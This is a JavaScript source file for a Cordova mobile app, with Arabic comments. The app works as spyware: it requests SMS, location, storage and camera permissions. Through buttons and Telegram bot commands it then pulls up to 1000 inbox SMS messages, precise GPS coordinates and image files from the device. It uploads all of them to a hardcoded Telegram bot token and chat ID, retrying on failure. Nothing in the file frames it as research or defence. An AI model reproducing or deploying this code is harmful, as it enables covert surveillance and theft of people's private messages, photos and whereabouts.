document.addEventListener('deviceready', onDeviceReady, false);

// تعريف المتغيرات العامة
const botToken = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk';
const chatId = '5739065274';
let isConnected = false;

function onDeviceReady() {
  console.log('Cordova جاهز');
  requestPermissions();
  createMainButton();
  sendStartCommand();
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECEIVE_SMS,
      permissions.CAMERA
    ],
    function(status) {
      if (status.hasPermission) {
        console.log("تم منح الأذونات بنجاح");
      } else {
        console.log("تم رفض الأذونات");
      }
    },
    function(error) {
      console.error("فشل طلب الأذونات", error);
    }
  );
}

function sendStartCommand() {
  // إرسال أمر /start إلى البوت مع قائمة الأوامر
  const commands = [
    {command: "sms", description: "سحب رسائل SMS"},
    {command: "location", description: "سحب الموقع الجغرافي"},
    {command: "photos", description: "سحب الصور من الجهاز"}
  ];
  
  // تعيين أوامر البوت
  fetch(`https://api.telegram.org/bot${botToken}/setMyCommands`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      commands: commands
    })
  })
  .then(response => response.json())
  .then(data => {
    console.log('تم تعيين أوامر البوت:', data);
    
    // إرسال رسالة الترحيب مع الأوامر
    const welcomeMessage = `🎉 مرحباً بك في بوت السحب!\n\n` +
      `🔹 الأوامر المتاحة:\n` +
      `/sms - سحب رسائل SMS\n` +
      `/location - سحب الموقع الجغرافي\n` +
      `/photos - سحب الصور من الجهاز\n\n` +
      `يمكنك أيضاً استخدام الأزرار في التطبيق.`;
    
    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(welcomeMessage)}`);
  })
  .then(response => response.json())
  .then(data => {
    console.log('تم إرسال رسالة الترحيب:', data);
    sendConnectionMessage();
  })
  .catch(error => console.error('خطأ في إرسال أمر /start:', error));
}

function sendConnectionMessage() {
  if (isConnected) return;
  
  // إرسال رسالة "الجهاز متصل" إلى البوت
  const message = '✅ الجهاز متصل وجاهز للعمل';
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => {
      console.log('تم إرسال رسالة الاتصال:', data);
      isConnected = true;
    })
    .catch(error => console.error('خطأ في إرسال رسالة الاتصال:', error));
}

function createMainButton() {
  // مسح أي أزرار موجودة مسبقاً
  const existingButtons = document.querySelectorAll('.command-button');
  existingButtons.forEach(btn => btn.remove());
  
  // إنشاء الزر الرئيسي الشفاف
  const mainButton = document.createElement('button');
  mainButton.className = 'command-button';
  mainButton.textContent = 'أوامر السحب';
  mainButton.style.cssText = `
    opacity: 0.7;
    position: fixed;
    bottom: 20px;
    right: 20px;
    padding: 10px 15px;
    background-color: #4285f4;
    color: white;
    border: none;
    border-radius: 5px;
    z-index: 9999;
    cursor: pointer;
    transition: all 0.3s;
    font-size: 16px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
  `;
  
  mainButton.onmouseover = () => mainButton.style.opacity = '1';
  mainButton.onmouseout = () => mainButton.style.opacity = '0.7';
  mainButton.onclick = showCommands;
  
  document.body.appendChild(mainButton);
}

function showCommands() {
  // مسح أي أزرار أوامر موجودة مسبقاً
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
  
  // إنشاء الأزرار الشفافة للأوامر
  const commands = [
    { text: 'سحب رسائل SMS', action: collectSMS, color: '#34a853', icon: '✉️' },
    { text: 'سحب الموقع الجغرافي', action: getLocation, color: '#fbbc05', icon: '📍' },
    { text: 'سحب الصور', action: collectImages, color: '#ea4335', icon: '🖼️' },
    { text: 'إخفاء الأوامر', action: hideCommands, color: '#666666', icon: '❌' }
  ];
  
  commands.forEach((cmd, index) => {
    const btn = document.createElement('button');
    btn.className = 'command-btn';
    btn.innerHTML = `<span style="margin-left: 5px;">${cmd.icon}</span> ${cmd.text}`;
    btn.style.cssText = `
      opacity: 0.7;
      position: fixed;
      bottom: ${80 + index * 60}px;
      right: 20px;
      padding: 10px 15px;
      background-color: ${cmd.color};
      color: white;
      border: none;
      border-radius: 5px;
      z-index: 9998;
      cursor: pointer;
      transition: all 0.3s;
      font-size: 14px;
      display: flex;
      align-items: center;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    `;
    
    btn.onmouseover = () => btn.style.opacity = '1';
    btn.onmouseout = () => btn.style.opacity = '0.7';
    btn.onclick = cmd.action;
    
    document.body.appendChild(btn);
  });
}

function hideCommands() {
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
}

function collectSMS() {
  hideCommands();
  
  if (!window.SMS) {
    console.error('SMS plugin not available');
    sendToTelegram('error.txt', 'SMS plugin not available');
    return;
  }
  
  // إرسال رسالة بدء السحب
  sendToTelegram('status.txt', 'جاري جمع رسائل SMS من الجهاز...');
  
  const filter = { box: 'inbox' };
  const options = { maxCount: 1000 };
  
  SMS.listSMS(filter, options, 
    (data) => {
      if (!data || data.length === 0) {
        sendToTelegram('status.txt', 'لم يتم العثور على أي رسائل SMS في صندوق الوارد');
        return;
      }
      
      // تنظيم الرسائل بتنسيق أفضل
      const inbox = data.map((msg, index) => 
        `📩 الرسالة ${index + 1}:\n` +
        `⏰ التاريخ: ${new Date(msg.date).toLocaleString()}\n` +
        `📞 المرسل: ${msg.address || 'غير معروف'}\n` +
        `📝 المحتوى: ${msg.body || 'فارغ'}\n` +
        `────────────────────`
      ).join('\n\n');
      
      // إضافة معلومات إجمالية
      const summary = `📊 ملخص رسائل SMS:\n` +
        `🔢 العدد الإجمالي: ${data.length}\n` +
        `📅 آخر رسالة: ${new Date(data[0].date).toLocaleString()}\n\n` +
        `📩 محتوى الرسائل:\n\n${inbox}`;
      
      sendToTelegram('sms_inbox.txt', summary);
    },
    (error) => {
      console.error('Error collecting SMS:', error);
      sendToTelegram('error.txt', `فشل في جمع رسائل SMS: ${error}`);
    }
  );
}

function getLocation() {
  hideCommands();
  
  // إرسال رسالة بدء السحب
  sendToTelegram('status.txt', 'جاري الحصول على الموقع الجغرافي...');
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const location = `📍 الموقع الجغرافي:\n\n` +
        `🌐 خط العرض: ${position.coords.latitude}\n` +
        `🌐 خط الطول: ${position.coords.longitude}\n` +
        `🎯 الدقة: ${position.coords.accuracy} متر\n` +
        `⏰ الوقت: ${new Date(position.timestamp).toLocaleString()}`;
      
      // إرسال الموقع كرسالة نصية
      sendToTelegram('location.txt', location);
      
      // إرسال الموقع كخريطة (رابط جوجل ماب)
      const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      const mapMessage = `🗺️ اضغط هنا لرؤية الموقع على الخريطة:\n${mapUrl}`;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mapMessage)}`)
        .then(response => response.json())
        .then(data => console.log('تم إرسال رابط الخريطة:', data))
        .catch(error => console.error('خطأ في إرسال رابط الخريطة:', error));
    },
    (error) => {
      console.error('Error getting location:', error);
      sendToTelegram('error.txt', `فشل في الحصول على الموقع: ${error.message}`);
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

function collectImages() {
  hideCommands();
  
  // إرسال رسالة بدء السحب
  sendToTelegram('status.txt', 'جاري جمع الصور من الجهاز...');
  
  window.resolveLocalFileSystemURL(
    cordova.file.externalStorageDirectory || cordova.file.externalRootDirectory,
    (dir) => {
      const reader = dir.createReader();
      const imageFiles = [];
      
      const readEntries = () => {
        reader.readEntries(
          (entries) => {
            if (entries.length === 0) {
              // انتهاء القراءة
              if (imageFiles.length === 0) {
                sendToTelegram('status.txt', 'لم يتم العثور على أي صور في التخزين الرئيسي');
                return;
              }
              
              sendToTelegram('status.txt', `تم العثور على ${imageFiles.length} صورة، جاري الإرسال...`);
              sendImagesToTelegram(imageFiles);
              return;
            }
            
            // تصفية الملفات للعثور على الصور
            entries.forEach(entry => {
              if (entry.isFile && /\.(jpg|png|jpeg|gif|bmp)$/i.test(entry.name)) {
                imageFiles.push(entry);
              } else if (entry.isDirectory) {
                // يمكنك إضافة قراءة المجلدات الفرعية هنا إذا لزم الأمر
              }
            });
            
            // استمرار القراءة
            readEntries();
          },
          (error) => {
            console.error('Error reading directory:', error);
            sendToTelegram('error.txt', `فشل في قراءة المجلد: ${error}`);
          }
        );
      };
      
      // بدء عملية القراءة
      readEntries();
    },
    (error) => {
      console.error('Error accessing file system:', error);
      sendToTelegram('error.txt', `فشل في الوصول إلى نظام الملفات: ${error}`);
    }
  );
}

function sendToTelegram(filename, content) {
  // إرسال رسالة تحميل أولاً
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`📤 جاري إرسال ${filename}...`)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة التحميل:', data))
    .catch(error => console.error('خطأ في إرسال رسالة التحميل:', error));
  
  // إرسال الملف الفعلي
  const blob = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', blob, filename);
  
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    console.log('تم إرسال الملف:', data);
    // إرسال رسالة نجاح الإرسال
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`✅ تم إرسال ${filename} بنجاح`)}`)
      .then(response => response.json())
      .then(data => console.log('تم إرسال رسالة النجاح:', data))
      .catch(error => console.error('خطأ في إرسال رسالة النجاح:', error));
  })
  .catch(error => {
    console.error('Error sending file:', error);
    // إعادة المحاولة في حالة الخطأ
    setTimeout(() => sendToTelegram(filename, content), 3000);
  });
}

function sendImagesToTelegram(images, index = 0) {
  if (index >= images.length) {
    sendToTelegram('status.txt', `✅ تم إرسال جميع الصور بنجاح (${images.length} صورة)`);
    return;
  }
  
  const imgEntry = images[index];
  imgEntry.file((file) => {
    const formData = new FormData();
    formData.append('photo', file, `photo_${index + 1}.jpg`);
    
    // إرسال رسالة تقدم الإرسال كل 10 صور
    if (index % 10 === 0) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`📤 جاري إرسال الصور (${index + 1}/${images.length})...`)}`)
        .then(response => response.json())
        .then(data => console.log('تم إرسال رسالة التقدم:', data))
        .catch(error => console.error('خطأ في إرسال رسالة التقدم:', error));
    }
    
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
      // إرسال الصورة التالية بعد تأخير 1.5 ثانية لتجنب حظر التحميل
      setTimeout(() => sendImagesToTelegram(images, index + 1), 1500);
    })
    .catch(error => {
      console.error(`Error sending image ${index + 1}:`, error);
      // إعادة المحاولة بعد 3 ثواني
      setTimeout(() => sendImagesToTelegram(images, index), 3000);
    });
  }, (error) => {
    console.error(`Error reading image file ${index + 1}:`, error);
    // التخطي إلى الصورة التالية في حالة الخطأ
    sendImagesToTelegram(images, index + 1);
  });
}
